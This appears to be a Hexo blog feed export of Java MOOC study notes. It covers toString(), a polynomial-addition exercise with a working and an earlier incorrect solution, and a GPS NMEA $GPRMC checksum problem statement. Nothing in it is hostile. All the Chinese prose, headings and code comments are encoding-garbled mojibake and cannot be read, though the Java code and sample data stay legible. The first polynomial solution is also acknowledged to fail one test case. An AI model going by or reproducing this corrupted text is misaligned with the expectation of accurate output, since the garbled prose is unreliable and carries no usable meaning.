<h2 id="å­¦ä¹ å¿ƒå¾—ï¼š"><a href="#å­¦ä¹ å¿ƒå¾—ï¼š" class="headerlink" title="å­¦ä¹ å¿ƒå¾—ï¼š"></a>å­¦ä¹ å¿ƒå¾—ï¼š</h2><p>toStringï¼ˆï¼‰æ–¹æ³•æ˜¯Objectç±»çš„ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œæ‰€æœ‰çš„Javaç±»éƒ½æ˜¯Objectç±»çš„å­ç±»ï¼Œæ•…æ‰€æœ‰çš„Javaç±»éƒ½æœ‰toStringï¼ˆï¼‰æ–¹æ³•ã€‚<br>é™¤æ­¤å¤–ï¼Œæ‰€æœ‰çš„Javaç±»çš„å¯¹è±¡éƒ½å¯ä»¥å’Œå­—ç¬¦ä¸²è¿›è¡Œè¿æ¥è¿ç®—ï¼Œå½“Javaç±»å¯¹è±¡å’Œå­—ç¬¦ä¸²è¿›è¡Œè¿æ¥è¿ç®—æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨Javaå¯¹è±¡toStringï¼ˆï¼‰æ–¹æ³•çš„è¿”å›å€¼å’Œå­—ç¬¦ä¸²è¿›è¡Œè¿æ¥æ“ä½œï¼Œå¦‚ï¼š<br>&#160; &#160; &#160; &#160;String str&#x3D;p+â€œ123â€ï¼›<br>&#160; &#160; &#160; &#160;String str&#x3D;p.toString()+&quot;123&quot;;<br>toString()æ–¹æ³•æ˜¯ä¸€ä¸ªéå¸¸ç‰¹æ®Šçš„æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªâ€œè‡ªæˆ‘æè¿°â€æ–¹æ³•ï¼Œè¯¥æ–¹æ³•é€šå¸¸ç”¨äºå®ç°å½“ç¨‹åºå‘˜ç›´æ¥æ‰“å°è¯¥å¯¹è±¡æ—¶ï¼Œç³»ç»Ÿå°†ä¼šè¾“å‡ºè¯¥å¯¹è±¡çš„â€œè‡ªæˆ‘æè¿°â€ä¿¡æ¯ï¼Œç”¨ä»¥å‘Šè¯‰å¤–ç•Œè¯¥å¯¹è±¡å…·æœ‰çš„çŠ¶æ€ä¿¡æ¯ã€‚<br>Objectç±»æä¾›çš„toString()æ–¹æ³•æ€»æ˜¯è¿”å›è¯¥å¯¹è±¡å®ç°ç±»çš„â€ç±»å+@+hashCodeâ€å€¼ï¼Œè¿™ä¸ªè¿”å›å€¼ä¸èƒ½çœŸæ­£å®ç°â€œè‡ªæˆ‘æè¿°â€åŠŸèƒ½ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡å†™objectçš„toString()æ–¹æ³•ã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äº”å‘¨ç¼–ç¨‹é¢˜_å¤šé¡¹å¼åŠ æ³•</title>
    <url>/posts/51603/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>ä¸€ä¸ªå¤šé¡¹å¼å¯ä»¥è¡¨è¾¾ä¸ºxçš„å„æ¬¡å¹‚ä¸ç³»æ•°ä¹˜ç§¯çš„å’Œï¼Œæ¯”å¦‚ï¼š<br>2x6+3x5+12x3+6x+20<br>ç°åœ¨ï¼Œä½ çš„ç¨‹åºè¦è¯»å…¥ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œç„¶åè¾“å‡ºè¿™ä¸¤ä¸ªå¤šé¡¹å¼çš„å’Œï¼Œä¹Ÿå°±æ˜¯æŠŠå¯¹åº”çš„å¹‚ä¸Šçš„ç³»æ•°ç›¸åŠ ç„¶åè¾“å‡ºã€‚<br>ç¨‹åºè¦å¤„ç†çš„å¹‚æœ€å¤§ä¸º100ã€‚</p>
<span id="more"></span>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>æ€»å…±è¦è¾“å…¥ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œæ¯ä¸ªå¤šé¡¹å¼çš„è¾“å…¥æ ¼å¼å¦‚ä¸‹ï¼š<br>æ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªè¡¨ç¤ºå¹‚æ¬¡ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºè¯¥å¹‚æ¬¡çš„ç³»æ•°ï¼Œæ‰€æœ‰çš„ç³»æ•°éƒ½æ˜¯æ•´æ•°ã€‚ç¬¬ä¸€è¡Œä¸€å®šæ˜¯æœ€é«˜å¹‚ï¼Œæœ€åä¸€è¡Œä¸€å®šæ˜¯0æ¬¡å¹‚ã€‚<br>æ³¨æ„ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œä¹‹é—´ä¸ä¸€å®šæŒ‰ç…§å¹‚æ¬¡é™ä½é¡ºåºæ’åˆ—ï¼›å¦‚æœæŸä¸ªå¹‚æ¬¡çš„ç³»æ•°ä¸º0ï¼Œå°±ä¸å‡ºç°åœ¨è¾“å…¥æ•°æ®ä¸­äº†ï¼›0æ¬¡å¹‚çš„ç³»æ•°ä¸º0æ—¶è¿˜æ˜¯ä¼šå‡ºç°åœ¨è¾“å…¥æ•°æ®ä¸­ã€‚</p>
<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>ä»æœ€é«˜å¹‚å¼€å§‹ä¾æ¬¡é™åˆ°0å¹‚ï¼Œå¦‚ï¼š<br>2x6+3x5+12x3-6x+20<br>æ³¨æ„å…¶ä¸­çš„xæ˜¯å°å†™å­—æ¯xï¼Œè€Œä¸”æ‰€æœ‰çš„ç¬¦å·ä¹‹é—´éƒ½æ²¡æœ‰ç©ºæ ¼ï¼Œå¦‚æœæŸä¸ªå¹‚çš„ç³»æ•°ä¸º0åˆ™ä¸éœ€è¦æœ‰é‚£é¡¹ã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>6 2
5 3
3 12
1 6
0 20
6 2
5 3
2 12
1 6
0 20
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>4x6+6x5+12x3+12x2+12x+40
</p></div>


<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fifth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">101</span>];</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">			a[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m_max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// è¯»å…¥ç¬¬ä¸€ä¸ªå¤šé¡¹å¼</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] = n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span>(m!=<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// è¯»å…¥ç¬¬äºŒä¸ªå¤šé¡¹å¼</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] += n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span> (m!=<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m_max; j &gt;=<span class="number">0</span>; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j] != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[j]&gt;<span class="number">0</span>&amp;&amp;flag==<span class="literal">true</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(a[j]!=<span class="number">1</span>)</span><br><span class="line">					System.out.print(a[j]);</span><br><span class="line">				<span class="keyword">if</span>(j!=<span class="number">1</span>&amp;&amp;j!=<span class="number">0</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;x&quot;</span>+j);</span><br><span class="line">				<span class="keyword">if</span>(j==<span class="number">1</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">				flag=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åªæœ‰ä¸€ä¸ªæµ‹è¯•ç‚¹æ²¡è¿‡.....ä¸æƒ³æ”¹äº†.....</p>
<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>ç”¨ä¸€ä¸ªå¤§å°ä¸º101çš„æ•°ç»„æ¥å­˜ç³»æ•°ï¼Œæ•°ç»„çš„ä¸‹æ ‡å³ä¸ºå¹‚æŒ‡æ•°....<br>è‹¥ç³»æ•°ä¸ä¸º0åˆ™è¾“å‡º...<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š<br>        ç³»æ•°ä¸º1æˆ–-1æ—¶ä¸ç”¨è¾“å‡ºç³»æ•°ï¼›<br>        ç³»æ•°å°äº0æ—¶ï¼Œä¸è¾“å‡ºåŠ å·ï¼›<br>        å¹‚æŒ‡æ•°ä¸º1æ—¶,ä¸è¾“å‡ºå¹‚æŒ‡æ•°ï¼›<br>        å¹‚æŒ‡æ•°ä¸º0æ—¶ï¼Œåªè¾“å‡ºç³»æ•°ï¼›<br>å¼€å§‹çš„æ€è·¯æ˜¯å¯¹å¹‚æŒ‡æ•°ä¸º0æˆ–1æ—¶çš„è¾“å‡ºå•ç‹¬å¤„ç†ï¼Œä½†æ²¡æœ‰è€ƒè™‘åˆ°ç³»æ•°ä¸º1æˆ–-1çš„æƒ…å†µ...å¯¼è‡´æ²¡æœ‰ä¸€ä¸ªæµ‹è¯•ç‚¹é€šè¿‡...</p>
<h2 id="é”™è¯¯ä»£ç "><a href="#é”™è¯¯ä»£ç " class="headerlink" title="é”™è¯¯ä»£ç :"></a>é”™è¯¯ä»£ç :</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fifth_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in </span><br><span class="line"></span><br><span class="line">);</span><br><span class="line">		<span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">101</span>];</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">			a[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m_max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// è¯»å…¥ç¬¬ä¸€ä¸ªå¤šé¡¹å¼</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] = n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span>(m!=<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// è¯»å…¥ç¬¬äºŒä¸ªå¤šé¡¹å¼</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			m = in.nextInt();</span><br><span class="line">			n = in.nextInt();</span><br><span class="line">			a[m] += n;</span><br><span class="line">			<span class="keyword">if</span> (m &gt; m_max)</span><br><span class="line">				m_max = m;</span><br><span class="line">		&#125;<span class="keyword">while</span> (m!=<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m_max; j &gt; <span class="number">1</span>; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[j] != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (flag&amp;&amp;a[j]&gt;<span class="number">0</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(a[j]==-<span class="number">1</span>)</span><br><span class="line">					System.out.print(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">				System.out.print(a[j] + <span class="string">&quot;x&quot;</span> + j);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// å¤„ç†å¹‚æ¬¡ä¸º1çš„æƒ…å†µ</span></span><br><span class="line">		<span class="keyword">if</span> (a[<span class="number">1</span>] != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag&amp;&amp;a[<span class="number">1</span>]&gt;<span class="number">0</span>)</span><br><span class="line">				System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(a[<span class="number">1</span>]==-<span class="number">1</span>)</span><br><span class="line">				System.out.print(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">			System.out.print(a[<span class="number">1</span>] + <span class="string">&quot;x&quot;</span>);</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// å¤„ç†å¹‚æ¬¡ä¸º0çš„æƒ…å†µ</span></span><br><span class="line">		<span class="keyword">if</span> (a[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">				System.out.print(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">			System.out.print(a[<span class="number">0</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// System.out.println();</span></span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h2><p>&#160;&#160;&#160;&#160;æŠŠæºç å‘åˆ°äº†MOOCçš„è®¨è®ºåŒºï¼Œåœ¨çƒ­å¿ƒç½‘å‹çš„å¸®åŠ©ä¸‹ï¼Œç»ˆäºæ‰¾åˆ°äº†æœ‰ä¸€ä¸ªæµ‹è¯•ç‚¹æ²¡é€šè¿‡çš„åŸå› .....<br>&#160;&#160;&#160;&#160;å¯¹äºç³»æ•°å…¨éƒ¨ä¸º0çš„æƒ…å†µï¼Œç¨‹åºä¼šæ— è¾“å‡º.....<br>&#160;&#160;&#160;&#160;ä¾‹ï¼šå¯¹äºä¸‹åˆ—è¿™ç»„æ•°æ®</p>
<div class="note default no-icon"><p>
6 3
2 5
0 3
6 -3
2 -5
0 -3
</p></div>
åœ¨`in.close()`å‰é¢åŠ ä¸Šè¿™ä¸€æ®µå°±å¥½äº†
`if(!flag)`
`ã€€ã€€System.out.print("0");`
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é›¶åŸºç¡€å­¦Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å…­å‘¨ç¼–ç¨‹é¢˜_GPSæ•°æ®å¤„ç†</title>
    <url>/posts/48389/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>NMEA-0183åè®®æ˜¯ä¸ºäº†åœ¨ä¸åŒçš„GPSï¼ˆå…¨çƒå®šä½ç³»ç»Ÿï¼‰å¯¼èˆªè®¾å¤‡ä¸­å»ºç«‹ç»Ÿä¸€çš„BTCMï¼ˆæµ·äº‹æ— çº¿ç”µæŠ€æœ¯å§”å‘˜ä¼šï¼‰æ ‡å‡†ï¼Œç”±ç¾å›½å›½å®¶æµ·æ´‹ç”µå­åä¼šï¼ˆNMEA-The National Marine Electronics Associa-tionï¼‰åˆ¶å®šçš„ä¸€å¥—é€šè®¯åè®®ã€‚GPSæ¥æ”¶æœºæ ¹æ®NMEA-0183åè®®çš„æ ‡å‡†è§„èŒƒï¼Œå°†ä½ç½®ã€é€Ÿåº¦ç­‰ä¿¡æ¯é€šè¿‡ä¸²å£ä¼ é€åˆ°PCæœºã€PDAç­‰è®¾å¤‡ã€‚</p>
<p>NMEA-0183åè®®æ˜¯GPSæ¥æ”¶æœºåº”å½“éµå®ˆçš„æ ‡å‡†åè®®ï¼Œä¹Ÿæ˜¯ç›®å‰GPSæ¥æ”¶æœºä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„åè®®ï¼Œå¤§å¤šæ•°å¸¸è§çš„GPSæ¥æ”¶æœºã€GPSæ•°æ®å¤„ç†è½¯ä»¶ã€å¯¼èˆªè½¯ä»¶éƒ½éµå®ˆæˆ–è€…è‡³å°‘å…¼å®¹è¿™ä¸ªåè®®ã€‚</p>
<span id="more"></span>

<p>NMEA-0183åè®®å®šä¹‰çš„è¯­å¥éå¸¸å¤šï¼Œä½†æ˜¯å¸¸ç”¨çš„æˆ–è€…è¯´å…¼å®¹æ€§æœ€å¹¿çš„è¯­å¥åªæœ‰$GPGGAã€$GPGSAã€$GPGSVã€$GPRMCã€$GPVTGã€$GPGLLç­‰ã€‚</p>
<p>å…¶ä¸­$GPRMCè¯­å¥çš„æ ¼å¼å¦‚ä¸‹ï¼š<br>$GPRMC,024813.640,A,3158.4608,N,11848.3737,E,10.05,324.27,150706,,,A*50</p>
<p>è¿™é‡Œæ•´æ¡è¯­å¥æ˜¯ä¸€ä¸ªæ–‡æœ¬è¡Œï¼Œè¡Œä¸­ä»¥é€—å·â€œ,â€éš”å¼€å„ä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µçš„å¤§å°ï¼ˆé•¿åº¦ï¼‰ä¸ä¸€ï¼Œè¿™é‡Œçš„ç¤ºä¾‹åªæ˜¯ä¸€ç§å¯èƒ½ï¼Œå¹¶ä¸èƒ½è®¤ä¸ºå­—æ®µçš„å¤§å°å°±å¦‚ä¸Šè¿°ä¾‹å¥ä¸€æ ·ã€‚</p>
<p>å­—æ®µ0ï¼š$GPRMCï¼Œè¯­å¥IDï¼Œè¡¨æ˜è¯¥è¯­å¥ä¸ºRecommended Minimum Specific GPS&#x2F;TRANSIT Dataï¼ˆRMCï¼‰æ¨èæœ€å°å®šä½ä¿¡æ¯<br>å­—æ®µ1ï¼šUTCæ—¶é—´ï¼Œhhmmss.sssæ ¼å¼<br>å­—æ®µ2ï¼šçŠ¶æ€ï¼ŒA&#x3D;å®šä½ï¼ŒV&#x3D;æœªå®šä½<br>å­—æ®µ3ï¼šçº¬åº¦ddmm.mmmmï¼Œåº¦åˆ†æ ¼å¼ï¼ˆå‰å¯¼ä½æ•°ä¸è¶³åˆ™è¡¥0ï¼‰<br>å­—æ®µ4ï¼šçº¬åº¦Nï¼ˆåŒ—çº¬ï¼‰æˆ–Sï¼ˆå—çº¬ï¼‰<br>å­—æ®µ5ï¼šç»åº¦dddmm.mmmmï¼Œåº¦åˆ†æ ¼å¼ï¼ˆå‰å¯¼ä½æ•°ä¸è¶³åˆ™è¡¥0ï¼‰<br>å­—æ®µ6ï¼šç»åº¦Eï¼ˆä¸œç»ï¼‰æˆ–Wï¼ˆè¥¿ç»ï¼‰<br>å­—æ®µ7ï¼šé€Ÿåº¦ï¼ŒèŠ‚ï¼ŒKnots<br>å­—æ®µ8ï¼šæ–¹ä½è§’ï¼Œåº¦<br>å­—æ®µ9ï¼šUTCæ—¥æœŸï¼ŒDDMMYYæ ¼å¼<br>å­—æ®µ10ï¼šç£åè§’ï¼Œï¼ˆ000 - 180ï¼‰åº¦ï¼ˆå‰å¯¼ä½æ•°ä¸è¶³åˆ™è¡¥0ï¼‰<br>å­—æ®µ11ï¼šç£åè§’æ–¹å‘ï¼ŒE&#x3D;ä¸œW&#x3D;è¥¿<br>å­—æ®µ16ï¼šæ ¡éªŒå€¼</p>
<p>è¿™é‡Œï¼Œâ€œ<em>â€ä¸ºæ ¡éªŒå’Œè¯†åˆ«ç¬¦ï¼Œå…¶åé¢çš„ä¸¤ä½æ•°ä¸ºæ ¡éªŒå’Œï¼Œä»£è¡¨äº†â€œ$â€å’Œâ€œ</em>â€ä¹‹é—´æ‰€æœ‰å­—ç¬¦ï¼ˆä¸åŒ…æ‹¬è¿™ä¸¤ä¸ªå­—ç¬¦ï¼‰çš„å¼‚æˆ–å€¼çš„åå…­è¿›åˆ¶å€¼ã€‚ä¸Šé¢è¿™æ¡ä¾‹å¥çš„æ ¡éªŒå’Œæ˜¯åå…­è¿›åˆ¶çš„50ï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„80ã€‚</p>
<p>æç¤ºï¼š^è¿ç®—ç¬¦çš„ä½œç”¨æ˜¯å¼‚æˆ–ã€‚å°†$å’Œ<em>ä¹‹é—´æ‰€æœ‰çš„å­—ç¬¦åš^è¿ç®—(ç¬¬ä¸€ä¸ªå­—ç¬¦å’Œç¬¬äºŒä¸ªå­—ç¬¦å¼‚æˆ–ï¼Œç»“æœå†å’Œç¬¬ä¸‰ä¸ªå­—ç¬¦å¼‚æˆ–ï¼Œä¾æ­¤ç±»æ¨)ä¹‹åçš„å€¼å¯¹65536å–ä½™åçš„ç»“æœï¼Œåº”è¯¥å’Œ</em>åé¢çš„ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—çš„å€¼ç›¸ç­‰ï¼Œå¦åˆ™çš„è¯è¯´æ˜è¿™æ¡è¯­å¥åœ¨ä¼ è¾“ä¸­å‘ç”Ÿäº†é”™è¯¯ã€‚æ³¨æ„è¿™ä¸ªåå…­è¿›åˆ¶å€¼ä¸­æ˜¯ä¼šå‡ºç°A-Fçš„å¤§å†™å­—æ¯çš„ã€‚å¦å¤–ï¼Œå¦‚æœä½ éœ€è¦çš„è¯ï¼Œå¯ä»¥ç”¨Integer.parseInt(s)ä»Stringå˜é‡sä¸­å¾—åˆ°å…¶æ‰€è¡¨è¾¾çš„æ•´æ•°æ•°å­—ï¼›è€ŒInteger.parseInt(s, 16)ä»Stringå˜é‡sä¸­å¾—åˆ°å…¶æ‰€è¡¨è¾¾çš„åå…­è¿›åˆ¶æ•°å­—</p>
<p>ç°åœ¨ï¼Œä½ çš„ç¨‹åºè¦è¯»å…¥ä¸€ç³»åˆ—GPSè¾“å‡ºï¼Œå…¶ä¸­åŒ…å«$GPRMCï¼Œä¹ŸåŒ…å«å…¶ä»–è¯­å¥ã€‚åœ¨æ•°æ®çš„æœ€åï¼Œæœ‰ä¸€è¡Œå•ç‹¬çš„<br>END<br>è¡¨ç¤ºæ•°æ®çš„ç»“æŸã€‚</p>
<p>ä½ çš„ç¨‹åºè¦ä»ä¸­æ‰¾å‡º$GPRMCè¯­å¥ï¼Œè®¡ç®—æ ¡éªŒå’Œï¼Œæ‰¾å‡ºå…¶ä¸­æ ¡éªŒæ­£ç¡®ï¼Œå¹¶ä¸”å­—æ®µ2è¡¨ç¤ºå·²å®šä½çš„è¯­å¥ï¼Œä»ä¸­è®¡ç®—å‡ºæ—¶é—´ï¼Œæ¢ç®—æˆåŒ—äº¬æ—¶é—´ã€‚ä¸€æ¬¡æ•°æ®ä¸­ä¼šåŒ…å«å¤šæ¡$GPRMCè¯­å¥ï¼Œä»¥æœ€åä¸€æ¡è¯­å¥å¾—åˆ°çš„åŒ—äº¬æ—¶é—´ä½œä¸ºç»“æœè¾“å‡ºã€‚</p>
<p>ä½ çš„ç¨‹åºä¸€å®šä¼šè¯»åˆ°ä¸€æ¡æœ‰æ•ˆçš„$GPRMCè¯­å¥ã€‚</p>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>å¤šæ¡GPSè¯­å¥ï¼Œæ¯æ¡å‡ä»¥å›è½¦æ¢è¡Œç»“æŸã€‚æœ€åä¸€è¡Œæ˜¯ENDä¸‰ä¸ªå¤§å†™å­—æ¯ã€‚</p>
<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>6ä½æ•°æ—¶é—´ï¼Œè¡¨è¾¾ä¸ºï¼š<br>hh:mm:ss<br>å…¶ä¸­ï¼Œhhæ˜¯ä¸¤ä½æ•°çš„å°æ—¶ï¼Œä¸è¶³ä¸¤ä½æ—¶å‰é¢è¡¥0ï¼›mmæ˜¯ä¸¤ä½æ•°çš„åˆ†é’Ÿï¼Œä¸è¶³ä¸¤ä½æ—¶å‰é¢è¡¥0ï¼›ssæ˜¯ä¸¤ä½æ•°çš„ç§’ï¼Œä¸è¶³ä¸¤ä½æ—¶å‰é¢è¡¥0ã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>$GPRMC,024813.640,A,3158.4608,N,11848.3737,E,10.05,324.27,150706,,,A*50
END
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>10:48:13
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
